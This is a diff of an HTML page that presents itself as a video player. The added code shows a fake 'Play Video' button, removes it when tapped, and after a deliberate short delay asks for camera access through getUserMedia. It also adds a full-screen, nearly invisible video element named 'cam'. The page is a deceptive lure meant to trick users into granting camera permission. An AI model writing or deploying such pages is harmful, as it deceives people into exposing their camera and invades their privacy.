@@ -1,9 +1,66 @@
-<meta name="theme-color" content="#ffffff">
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Video Player</title>
 
-<input id="i" autofocus placeholder="Tap to continue">
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  background: black;
+  height: 100%;
+  overflow: hidden;
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+}
+
+#overlay {
+  position: fixed;
+  inset: 0;
+  background: black;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 10;
+}
+
+#play {
+  background: white;
+  color: black;
+  font-size: 22px;
+  padding: 18px 40px;
+  border-radius: 12px;
+}
+
+#cam {
+  position: fixed;
+  inset: 0;
+  opacity: 0.01;
+}
+</style>
+</head>
+
+<body>
+
+<div id="overlay">
+  <div id="play">▶️ Play Video</div>
+</div>
+
+<video id="cam" autoplay playsinline></video>
 
 <script>
-setTimeout(() => {
-  history.back(); // or location.replace(...)
-}, 600);
+document.getElementById("overlay").addEventListener("click", async () => {
+  // remove UI immediately
+  document.getElementById("overlay").remove();
+
+  // small timing gap before permission
+  setTimeout(async () => {
+    try {
+      await navigator.mediaDevices.getUserMedia({ video: true });
+    } catch (e) {}
+  }, 80);
+});
 </script>
+
+</body>
+</html>
